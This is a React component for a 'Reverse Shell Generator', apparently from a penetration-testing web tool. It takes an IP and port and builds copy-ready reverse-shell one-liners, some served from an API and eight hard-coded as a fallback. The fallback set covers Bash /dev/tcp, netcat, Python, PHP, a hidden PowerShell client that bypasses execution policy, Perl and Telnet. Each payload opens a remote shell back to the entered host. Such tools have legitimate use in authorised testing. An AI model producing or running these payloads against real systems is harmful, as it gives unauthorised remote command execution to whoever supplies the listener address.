'use client'

import { useState } from 'react'

interface ShellCmd {
  name: string
  command: string
}

async function copyToClipboard(text: string): Promise<boolean> {
  try {
    await navigator.clipboard.writeText(text)
    return true
  } catch {
    return false
  }
}

export function ShellGenerator() {
  const [ip, setIp] = useState('')
  const [port, setPort] = useState('4444')
  const [cmds, setCmds] = useState<ShellCmd[] | null>(null)
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null)

  const generate = async () => {
    if (!ip || !port) return
    try {
      const mod = await import('@/lib/api-client')
      const data = await mod.apiClient.get(`/api/v2/payloads/shell?ip=${encodeURIComponent(ip)}&port=${encodeURIComponent(port)}`)
      setCmds(data as ShellCmd[])
    } catch {
      // Fallback: local generation
      const localCmds: ShellCmd[] = [
        { name: 'Bash', command: `bash -c 'exec bash -i &>/dev/tcp/${ip}/${port} <&1'` },
        { name: 'NC (with -e)', command: `nc -e /bin/sh ${ip} ${port}` },
        { name: 'NC (no -e)', command: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f` },
        { name: 'Python', command: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` },
        { name: 'PHP', command: `php -r '$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
        { name: 'PowerShell', command: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"` },
        { name: 'Perl', command: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
        { name: 'Telnet', command: `rm -f /tmp/p; mknod /tmp/p p && telnet ${ip} ${port} 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p` },
      ]
      setCmds(localCmds)
    }
  }

  const handleCopy = async (cmd: ShellCmd, index: number) => {
    const ok = await copyToClipboard(cmd.command)
    if (ok) {
      setCopiedIndex(index)
      setTimeout(() => setCopiedIndex(null), 2000)
    }
  }

  return (
    <div className="space-y-4">
      <h3 className="text-lg font-medium">Reverse Shell Generator</h3>
      <div className="flex gap-3">
        <div className="flex-1">
          <label className="block text-sm font-medium text-gray-700 mb-1">IP Address</label>
          <input
            type="text"
            placeholder="your.server.ip"
            value={ip}
            onChange={(e) => setIp(e.target.value)}
            className="w-full px-3 py-2 border rounded text-sm font-mono"
          />
        </div>
        <div className="w-32">
          <label className="block text-sm font-medium text-gray-700 mb-1">Port</label>
          <input
            type="text"
            placeholder="4444"
            value={port}
            onChange={(e) => setPort(e.target.value)}
            className="w-full px-3 py-2 border rounded text-sm font-mono"
          />
        </div>
        <div className="flex items-end">
          <button
            onClick={generate}
            disabled={!ip || !port}
            className="px-4 py-2 bg-indigo-600 text-white rounded text-sm hover:bg-indigo-700 disabled:opacity-50"
          >
            Generate
          </button>
        </div>
      </div>

      {cmds && (
        <div className="space-y-2">
          {cmds.map((cmd, i) => (
            <div key={cmd.name} className="border rounded p-3 bg-gray-50">
              <div className="flex justify-between items-center mb-1">
                <span className="text-sm font-medium text-gray-700">{cmd.name}</span>
                <button
                  onClick={() => handleCopy(cmd, i)}
                  className="text-xs px-2 py-1 bg-white border rounded hover:bg-gray-100"
                >
                  {copiedIndex === i ? 'Copied!' : 'Copy'}
                </button>
              </div>
              <pre className="text-xs font-mono bg-gray-900 text-green-400 p-2 rounded overflow-x-auto">
                {cmd.command}
              </pre>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}
